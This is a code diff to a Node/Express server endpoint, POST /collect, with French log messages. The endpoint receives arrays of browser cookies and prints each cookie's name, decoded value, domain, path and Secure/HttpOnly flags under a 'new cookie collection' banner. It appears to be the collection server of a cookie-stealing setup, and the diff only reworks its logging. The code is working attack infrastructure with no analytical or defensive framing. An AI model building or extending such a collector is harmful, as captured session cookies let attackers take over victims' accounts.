@@ -13,35 +13,36 @@ function safeDecode(value) {
 
 app.post("/collect", (req, res) => {
   const cookies = req.body.cookies;
-
   const now = new Date();
-  console.log("\n==============================");
-  console.log("🍪 NOUVELLE RÉCUPÉRATION");
-  console.log("📅", now.toLocaleDateString("fr-FR"));
-  console.log("⏰", now.toLocaleTimeString("fr-FR"));
-  console.log("==============================");
 
-  // 🟢 CAS 1 : cookies est un TABLEAU (cas normal)
-  if (Array.isArray(cookies)) {
-    cookies.forEach((cookie, index) => {
-      console.log(`\nCookie ${index + 1}`);
-      console.log("Nom      :", cookie.name);
-      console.log("Valeur   :", safeDecode(cookie.value));
-      console.log("Domaine  :", cookie.domain);
-      console.log("Secure   :", cookie.secure);
-      console.log("HttpOnly :", cookie.httpOnly);
-    });
+  console.log("\n\n========================================");
+  console.log("🍪 NOUVELLE RÉCUPÉRATION DE COOKIES");
+  console.log("📅 Date :", now.toLocaleDateString("fr-FR"));
+  console.log("⏰ Heure:", now.toLocaleTimeString("fr-FR"));
+  console.log("========================================");
 
-  // 🟡 CAS 2 : cookies est une STRING
-  } else if (typeof cookies === "string") {
-    console.log("\n⚠️ Cookies reçus sous forme de texte");
-    console.log(safeDecode(cookies));
-
-  // 🔴 CAS 3 : rien reçu
-  } else {
-    console.log("\n❌ Aucun cookie valide reçu");
-    console.log("Type reçu :", typeof cookies);
+  if (!Array.isArray(cookies)) {
+    console.log("❌ ERREUR : cookies n'est pas un tableau");
+    console.log("Reçu :", cookies);
+    console.log("========================================\n");
+    return res.json({ status: "error" });
   }
+
+  cookies.forEach((cookie, index) => {
+    console.log("\n----------------------------------------");
+    console.log(`🍪 COOKIE ${index + 1}`);
+    console.log("----------------------------------------");
+    console.log("Nom       :", cookie.name);
+    console.log("Valeur    :", safeDecode(cookie.value || ""));
+    console.log("Domaine   :", cookie.domain);
+    console.log("Path      :", cookie.path);
+    console.log("Secure    :", cookie.secure);
+    console.log("HttpOnly  :", cookie.httpOnly);
+  });
+
+  console.log("\n========================================");
+  console.log(`✅ ${cookies.length} cookie(s) reçus`);
+  console.log("========================================\n");
 
   res.json({ status: "ok" });
 });
